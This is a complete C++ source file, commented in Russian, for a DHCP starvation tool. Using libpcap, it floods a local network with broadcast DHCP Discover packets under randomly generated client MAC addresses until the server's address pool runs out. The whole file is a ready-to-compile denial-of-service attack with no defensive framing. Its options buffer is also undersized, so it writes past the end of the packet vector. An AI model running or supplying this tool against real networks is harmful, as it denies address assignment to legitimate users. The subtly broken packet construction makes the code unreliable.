// g++ -O2 -pthread dhcp_starvation.cpp -o dhcp_starvation -lpcap -std=c++11
#include <pcap.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <signal.h>
#include <atomic>
#include <thread>
#include <chrono>
#include <vector>
#include <string>
#include <random>

// ========== Структуры заголовков ==========
#pragma pack(push, 1)

struct ether_header {
    uint8_t  dst_mac[6];
    uint8_t  src_mac[6];
    uint16_t ether_type;
};

struct ip_header {
    uint8_t  ihl:4, version:4;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

struct udp_header {
    uint16_t source;
    uint16_t dest;
    uint16_t len;
    uint16_t check;
};

struct bootp_header {
    uint8_t  opcode;
    uint8_t  htype;
    uint8_t  hlen;
    uint8_t  hops;
    uint32_t xid;
    uint16_t secs;
    uint16_t flags;
    uint32_t ciaddr;
    uint32_t yiaddr;
    uint32_t siaddr;
    uint32_t giaddr;
    uint8_t  chaddr[16];
    uint8_t  sname[64];
    uint8_t  file[128];
    uint32_t magic;
    // options follow
};

#pragma pack(pop)

std::atomic<bool> stop_flag(false);

void signal_handler(int sig) {
    stop_flag = true;
}

// ========== Вспомогательные функции ==========
bool get_if_mac(const char* ifname, uint8_t* mac) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return false;
    strcpy(ifr.ifr_name, ifname);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) { close(sock); return false; }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);
    return true;
}

uint16_t checksum(uint16_t *ptr, int len) {
    uint32_t sum = 0;
    while (len > 1) { sum += *ptr++; len -= 2; }
    if (len) sum += *(uint8_t*)ptr;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return ~sum;
}

// Генерация случайного MAC (локально администрируемый, unicast)
void random_mac(uint8_t* mac) {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(0, 255);
    mac[0] = 0x02; // локально администрируемый, unicast
    for (int i = 1; i < 6; i++) {
        mac[i] = dis(gen);
    }
}

void random_xid(uint32_t* xid) {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<uint32_t> dis(0, 0xFFFFFFFF);
    *xid = dis(gen);
}

// ========== Построение и отправка DHCP Discover ==========
void send_dhcp_discover(pcap_t* handle, const char* iface, uint8_t* src_mac) {
    // Генерируем случайный MAC для этого запроса
    uint8_t client_mac[6];
    random_mac(client_mac);

    uint32_t xid;
    random_xid(&xid);

    // Размер пакета: Ethernet + IP + UDP + BOOTP + минимальные DHCP options
    size_t packet_len = sizeof(ether_header) + sizeof(ip_header) + sizeof(udp_header) +
                        sizeof(bootp_header) + 12; // 12 байт на DHCP options

    std::vector<uint8_t> packet(packet_len, 0);
    uint8_t* ptr = packet.data();

    // Ethernet
    ether_header* eth = (ether_header*)ptr;
    memset(eth->dst_mac, 0xFF, 6); // broadcast
    memcpy(eth->src_mac, src_mac, 6); // наш реальный MAC (для исходящего интерфейса)
    eth->ether_type = htons(0x0800);
    ptr += sizeof(ether_header);

    // IP
    ip_header* ip = (ip_header*)ptr;
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(ip_header) + sizeof(udp_header) + sizeof(bootp_header) + 12);
    ip->id = 0;
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = 17; // UDP
    ip->check = 0;
    ip->saddr = 0; // 0.0.0.0
    ip->daddr = htonl(0xFFFFFFFF); // 255.255.255.255
    ip->check = checksum((uint16_t*)ip, sizeof(ip_header));
    ptr += sizeof(ip_header);

    // UDP
    udp_header* udp = (udp_header*)ptr;
    udp->source = htons(68);
    udp->dest = htons(67);
    udp->len = htons(sizeof(udp_header) + sizeof(bootp_header) + 12);
    udp->check = 0; // можно не считать для простоты (но для правильности лучше считать)
    // Псевдозаголовок для UDP checksum можно опустить, т.к. многие DHCP-серверы принимают без checksum
    ptr += sizeof(udp_header);

    // BOOTP
    bootp_header* bootp = (bootp_header*)ptr;
    bootp->opcode = 1; // BOOTREQUEST
    bootp->htype = 1; // Ethernet
    bootp->hlen = 6;
    bootp->hops = 0;
    bootp->xid = htonl(xid);
    bootp->secs = 0;
    bootp->flags = 0;
    bootp->ciaddr = 0;
    bootp->yiaddr = 0;
    bootp->siaddr = 0;
    bootp->giaddr = 0;
    memcpy(bootp->chaddr, client_mac, 6);
    memset(bootp->chaddr + 6, 0, 10);
    memset(bootp->sname, 0, 64);
    memset(bootp->file, 0, 128);
    bootp->magic = htonl(0x63825363); // DHCP magic cookie
    ptr += sizeof(bootp_header);

    // DHCP options (минимальный набор)
    // Option 53: DHCP Discover (1)
    *ptr++ = 53;
    *ptr++ = 1;
    *ptr++ = 1; // DHCPDISCOVER

    // Option 12: Hostname (опционально)
    *ptr++ = 12;
    *ptr++ = 5;
    const char* host = "test";
    memcpy(ptr, host, 5);
    ptr += 5;

    // Option 55: Parameter Request List (опционально)
    *ptr++ = 55;
    *ptr++ = 4;
    *ptr++ = 1;  // Subnet Mask
    *ptr++ = 3;  // Router
    *ptr++ = 6;  // DNS
    *ptr++ = 15; // Domain Name

    // End option
    *ptr++ = 255;

    // Отправка пакета
    if (pcap_sendpacket(handle, packet.data(), packet.size()) != 0) {
        fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
    }
}

// ========== main ==========
int main(int argc, char* argv[]) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <interface> <count> <delay_sec>\n", argv[0]);
        return 1;
    }

    char* iface = argv[1];
    int count = atoi(argv[2]);
    double delay = atof(argv[3]);

    if (count <= 0 || delay < 0) {
        fprintf(stderr, "Invalid count or delay\n");
        return 1;
    }

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    // Получаем MAC интерфейса (реальный)
    uint8_t real_mac[6];
    if (!get_if_mac(iface, real_mac)) {
        fprintf(stderr, "Cannot get MAC for %s\n", iface);
        return 1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(iface, 65536, 1, 1000, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live: %s\n", errbuf);
        return 1;
    }
    if (pcap_datalink(handle) != DLT_EN10MB) {
        fprintf(stderr, "Interface doesn't support Ethernet\n");
        pcap_close(handle);
        return 1;
    }

    printf("DHCP Starvation started on %s\n", iface);
    printf("Real MAC: "); for(int i=0;i<6;i++) printf("%02X%s", real_mac[i], i<5?":":"");
    printf("\nCount: %d, Delay: %.2f sec\n", count, delay);
    printf("Sending DHCP Discover packets with random MACs...\n");
    fflush(stdout);

    int sent = 0;
    for (int i = 0; i < count && !stop_flag; i++) {
        send_dhcp_discover(handle, iface, real_mac);
        sent++;
        if (sent % 100 == 0) {
            printf("Sent %d DHCP Discover packets\n", sent);
            fflush(stdout);
        }
        if (delay > 0) {
            std::this_thread::sleep_for(std::chrono::milliseconds((int)(delay * 1000)));
        }
    }

    pcap_close(handle);
    printf("DHCP Starvation stopped. Sent %d packets.\n", sent);
    return 0;
}